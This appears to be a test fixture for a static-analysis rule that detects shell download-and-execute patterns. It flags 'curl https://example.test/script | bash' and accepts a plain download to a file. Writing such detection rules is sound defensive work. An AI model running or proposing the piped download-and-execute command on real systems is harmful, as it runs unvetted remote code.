# SPDX-License-Identifier: MIT
# ruleid: preflyt-shell-download-execute
curl https://example.test/script | bash
# ok: preflyt-shell-download-execute
curl --output script https://example.test/script
